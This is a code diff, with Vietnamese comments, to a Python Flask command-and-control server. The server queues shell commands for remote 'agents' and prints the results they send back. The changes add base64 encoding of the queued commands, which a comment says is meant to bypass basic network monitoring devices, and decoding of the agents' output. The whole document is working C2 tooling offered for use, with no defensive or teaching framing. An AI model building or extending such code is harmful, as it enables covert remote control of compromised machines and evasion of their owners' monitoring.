@@ -5,8 +5,9 @@ import datetime
 import threading
 import time
 import sys
+import base64  
 
-# Tắt log mặc định của Flask để đỡ rối mắt khi chat
+# Tắt log mặc định của Flask
 import logging
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
@@ -18,6 +19,13 @@ agents = {}
 
 def generate_id():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+
+# --- Hàm hỗ trợ giải mã an toàn ---
+def safe_decode(data_str):
+    try:
+        return base64.b64decode(data_str).decode('utf-8', errors='ignore')
+    except Exception:
+        return f"[Raw Data] {data_str}"
 
 # --- API ENDPOINTS ---
 
@@ -40,20 +48,23 @@ def get_task(agent_id):
         # Lấy lệnh đầu tiên ra (First In First Out)
         task = agents[agent_id]['tasks'].pop(0)
         return task, 200
-    return '', 204 # 204 No Content (Không có việc gì làm)
+    return '', 204 
 
 @app.route('/results/<agent_id>', methods=['POST'])
 def receive_result(agent_id):
     if agent_id in agents:
-        output = request.form.get('result')
-        print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{output}")
-        print("C2 > ", end="", flush=True)
+        encoded_output = request.form.get('result')
+        if encoded_output:
+            # --- decode kết quả từ Agent trước khi in ---
+            decoded_output = safe_decode(encoded_output)
+            print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{decoded_output}")
+            print("C2 > ", end="", flush=True)
     return '', 200
 
-# --- CLI (Giao diện nhập lệnh) ---
+# --- CLI ---
 
 def console_thread():
-    time.sleep(2) # Đợi server start
+    time.sleep(2) 
     print("\n=== C2 COMMAND CENTER ===")
     print("Syntax: set <agent_id> <command>")
     print("Example: set A1B2C3 whoami")
@@ -66,11 +77,15 @@ def console_thread():
             parts = cmd.split(' ', 2)
             if parts[0] == "set" and len(parts) == 3:
                 target_id = parts[1]
-                task = parts[2]
+                plain_task = parts[2] # Lệnh dạng clear text
                 
                 if target_id in agents:
-                    agents[target_id]['tasks'].append(task)
-                    print(f"[*] Queued task '{task}' for Agent {target_id}")
+                    # --- Mã hóa lệnh trước khi đẩy vào hàng đợi ---
+                    # Mã hóa để bypass các thiết bị giám sát mạng cơ bản
+                    encoded_task = base64.b64encode(plain_task.encode()).decode()
+                    
+                    agents[target_id]['tasks'].append(encoded_task)
+                    print(f"[*] Queued encoded task for Agent {target_id}")
                 else:
                     print(f"[-] Agent ID {target_id} not found!")
             elif cmd == "list":
@@ -81,9 +96,7 @@ def console_thread():
             print(f"Error: {e}")
 
 if __name__ == '__main__':
-    # Chạy luồng nhập liệu song song
     t = threading.Thread(target=console_thread, daemon=True)
     t.start()
     
-    # Chạy server
     app.run(host='0.0.0.0', port=8080)
